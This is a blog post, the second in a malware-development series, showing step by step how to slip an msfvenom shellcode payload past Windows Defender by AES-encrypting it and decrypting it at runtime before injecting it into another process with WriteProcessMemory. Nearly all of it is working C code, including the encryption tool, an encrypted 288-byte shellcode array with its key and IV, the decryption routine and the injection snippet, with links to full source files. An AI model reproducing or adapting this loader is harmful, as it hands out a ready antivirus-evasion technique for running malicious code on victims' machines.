---
title: Maldev Series 2 | Bypass Defender
date: 2025-10-01 11:56:03 +0100
categories: [Maldev, Basic]
tags: [Maldev, Malware]
---

Hello guys, this is the episode 2 of the maldev series.

Today we are evading Windows Defender, already.

## Why starting at the middle?

In this episode I will assume that you read the first one.

So if it's not the case, go read it, right now!

## Let's evade

Maybe you think you need to know many things, bypass IAT, doing indirect syscall in order to bypass Defender?

You are far from the reality, you just need to encrypt msfvenom payload with AES, RC4 or even XOR, and this should be good, sounds easy, right? it is.

## The plan

1. Copy-paste the malware on the first stage
2. Change the plaintext payload by the encrypted payload
3. Decrypt the payload before writing the bytes
4. Do some calculus!

<aside>
💡

In this episode I’ll use AES encryption, RC4 is cool too with the use of SystemFunction032, but I’ll stick with AES, but keep in mind that for evading Windows Defender this doesn’t matter.

</aside>

## The execution of the plan

### 1. Copy-paste the malware on the first stage

No explanation needed.

### 2. Change the plaintext payload by the encrypted payload

So i suggest you to create a new file, where you’ll paste the plaintext msfvenom payload.

you’ll also need to define size of the **IV** and the **KEY.**

```
#define KEYSIZE 32   // 32 bytes for AES256
#define IVSIZE 16    // 16 bytes for AES
```

I suggest you to create a function to generate random bytes (for the key and the IV).

```c
// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}

}
```

There is also a print function for convenience : 

```c
// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
	if (strcmp(Name, "shellcode") == 0){printf("byte %s[%d] = {", Name,Size);}
	else {printf("unsigned char %s[] = {", Name);}
	for (SIZE_T i = 0; i < Size; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		if (i < Size - 1)
			printf("0x%02X, ", Data[i]);
		else
			printf("0x%02X ", Data[i]);
	}

	printf("\n};\n\n");
}

```

Because the payload needs to be a multiple of 16 for tiny-aes to work, we also need a padding function : 

```c

BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PaddedSize = 0;

	// calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// allocating buffer of size "PaddedSize"
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	// cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// copying old buffer to new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	//saving results :
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize = PaddedSize;

	return TRUE;
}
```

and there is the commented main : 

```c

int main() {
	// struct needed for Tiny-AES library
	struct AES_ctx ctx;

	BYTE pKey[KEYSIZE];                             // KEYSIZE is 32 bytes
	BYTE pIv[IVSIZE];                                // IVSIZE is 16 bytes

	srand(time(NULL));                              // the seed to generate the key
	GenerateRandomBytes(pKey, KEYSIZE);             // generating the key bytes

	srand(time(NULL) ^ pKey[0]);                    // The seed to generate the IV. Use the first byte of the key to add more randomness.
	GenerateRandomBytes(pIv, IVSIZE);               // Generating the IV

	// Prints both key and IV to the console
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	// Initializing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	// Initializing variables that will hold the new buffer base address in the case where padding is required and its size
	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PAddedSize = 0;

	// Padding the buffer, if required
	if (sizeof(shellcode) % 16 != 0) {
		PaddBuffer(shellcode, sizeof(shellcode), &PaddedBuffer, &PAddedSize);
		// Encrypting the padded buffer instead
		AES_CBC_encrypt_buffer(&ctx, PaddedBuffer, PAddedSize);
		// Printing the encrypted buffer to the console
		PrintHexData("shellcode", PaddedBuffer, PAddedSize);
	}
	// No padding is required, encrypt 'Data' directly
	else {
		AES_CBC_encrypt_buffer(&ctx, shellcode, sizeof(shellcode));
		// Printing the encrypted buffer to the console
		PrintHexData("shellcode", shellcode, sizeof(shellcode));
	}
	// Freeing PaddedBuffer, if necessary
	if (PaddedBuffer != NULL) {
		HeapFree(GetProcessHeap(), 0, PaddedBuffer);
	}
	system("PAUSE");
	return 0;
}
```

The result of this code is the encrypted shellcode, the key and the IV used to encrypt : 

```c
unsigned char pKey[] = {
        0xA9, 0x3A, 0x39, 0x5B, 0x07, 0x7C, 0xA3, 0xC7, 0x04, 0x04, 0xCF, 0x39, 0x07, 0x2F, 0xF1, 0x29,
        0x78, 0x54, 0x57, 0xB8, 0xC8, 0xB2, 0x94, 0x40, 0xB2, 0xA6, 0xDD, 0x30, 0xC1, 0x22, 0xB3, 0x17
};

unsigned char pIv[] = {
        0x81, 0x99, 0x14, 0xCF, 0xCB, 0x3B, 0xEF, 0x3C, 0xC9, 0xB3, 0x74, 0x25, 0xE9, 0x06, 0xA5, 0x50
};

byte shellcode[288] = {
        0x2A, 0x44, 0xCE, 0x0D, 0x77, 0x59, 0x04, 0x9F, 0x78, 0xFB, 0x31, 0xF7, 0xB1, 0x7D, 0x5D, 0x19,
        0xB7, 0x63, 0xF5, 0x5E, 0xEF, 0xD7, 0x18, 0x05, 0xC0, 0x75, 0xB2, 0x08, 0xD6, 0xD6, 0x5A, 0x5B,
        0xC8, 0xC2, 0x3A, 0xFA, 0x56, 0x31, 0xF6, 0x28, 0x94, 0x14, 0x2F, 0x8A, 0x55, 0x39, 0x83, 0x7C,
        0x3E, 0xF5, 0x54, 0x4E, 0x69, 0xFC, 0x28, 0x75, 0xD9, 0xC2, 0x65, 0x08, 0x6B, 0xF0, 0x36, 0x56,
        0x10, 0x4B, 0xF0, 0x7E, 0x0E, 0xFB, 0x55, 0xC7, 0xD6, 0x25, 0xE4, 0xBC, 0xDE, 0x1E, 0x4C, 0x1B,
        0x40, 0xD4, 0xFB, 0x3B, 0x69, 0x56, 0x13, 0x38, 0x29, 0xC6, 0xB2, 0x88, 0xEF, 0x72, 0x1F, 0xD7,
        0x03, 0xB9, 0x37, 0x80, 0xCB, 0xEE, 0xC3, 0xC1, 0xAF, 0x82, 0x63, 0x4C, 0xB6, 0x01, 0xC0, 0x5C,
        0xDA, 0x33, 0xD3, 0x14, 0x1A, 0xB0, 0xB2, 0x99, 0xCB, 0x45, 0x51, 0xE9, 0x19, 0x41, 0xCC, 0x66,
        0x8E, 0x78, 0xFC, 0x08, 0x94, 0xCF, 0x1D, 0xEE, 0x23, 0x8F, 0x1A, 0x0F, 0x47, 0x23, 0xFF, 0x06,
        0x24, 0x6B, 0xFD, 0xE4, 0xA3, 0x69, 0x37, 0xC4, 0xBD, 0x0B, 0x9F, 0x91, 0xB8, 0xA9, 0x29, 0x92,
        0xB1, 0x84, 0xDB, 0xF1, 0xB1, 0xE1, 0xED, 0xE0, 0xD2, 0x3A, 0xDB, 0x47, 0x58, 0x19, 0xCF, 0x03,
        0xAF, 0xBF, 0xCC, 0x30, 0x36, 0xA5, 0x9A, 0x36, 0x4B, 0x66, 0x80, 0x2D, 0x79, 0x77, 0x3F, 0xF1,
        0x4D, 0x22, 0x20, 0x6A, 0xB2, 0x56, 0xE3, 0xC9, 0xFF, 0xE7, 0xB1, 0x91, 0x96, 0x8A, 0x5F, 0xED,
        0xF4, 0x50, 0xB2, 0xBD, 0xBF, 0xA6, 0x7A, 0xBA, 0x8E, 0xE7, 0x6A, 0x36, 0xCE, 0x99, 0x91, 0x78,
        0xB7, 0xFE, 0xE5, 0xF2, 0xAB, 0x6C, 0x72, 0xB7, 0x8B, 0xD1, 0xFB, 0xC8, 0x52, 0xF8, 0xA8, 0xA4,
        0xB9, 0xEB, 0x44, 0xBE, 0x78, 0x38, 0x60, 0x74, 0xA4, 0x1C, 0xF5, 0xAE, 0xFF, 0x2A, 0x98, 0x92,
        0x5A, 0x4D, 0x6F, 0xE5, 0xC2, 0xA0, 0x96, 0x3A, 0x8B, 0xAE, 0x63, 0xBD, 0xD1, 0xDF, 0xF2, 0x5F,
        0xF1, 0x96, 0x05, 0xB9, 0xBE, 0x59, 0x1B, 0x8C, 0xB6, 0x10, 0xC2, 0xA7, 0xA4, 0xDC, 0x5F, 0x58
};
```

We’ll use this in the next file to execute the shellcode.

### 3. Decrypt the payload before writing the bytes

So, you remember when we used the `WriteProcessMemory` function?

In our main file we'll store the encrypted payload then we'll decrypt the shellcode then write the process memory.

So this is pretty simple, you just need this function :

```c

void decryptAES() {
    // Struct needed for Tiny-AES library
    struct AES_ctx ctx;
    // Initializing the Tiny-AES Library
    AES_init_ctx_iv(&ctx, pKey, pIv);

    // Decrypting
    AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));

    // Print the decrypted buffer to the console
    // PrintHexData("PlainText", shellcode, sizeof(shellcode));
}
```

and you need to call it right before writing to the process memory.

```c
    decryptAES();
    SIZE_T bytesWritten = 0;
    if (WriteProcessMemory(hProcess, allocatedMemory, shellcode, sizeof(shellcode), &bytesWritten) == 0) {
        DWORD getLastError = GetLastError();
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        printf("%s failed to write shellcode into the remote process memory: %ul\n", e, getLastError);
        return EXIT_FAILURE;
    }
    printf("%s bytes written: %llu\n", k, (unsigned long long)bytesWritten);
```

### 4. Do some calculus!

and with that you can now do some calculus.

![Successful execution](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/maldev5.png)

you can find the files here : 

[shellTransAES.c](https://github.com/WinDyAlphA/maldevSamples/blob/main/shellTransAES.c)  
[basicAES.c](https://github.com/WinDyAlphA/maldevSamples/blob/main/basicAES.c)

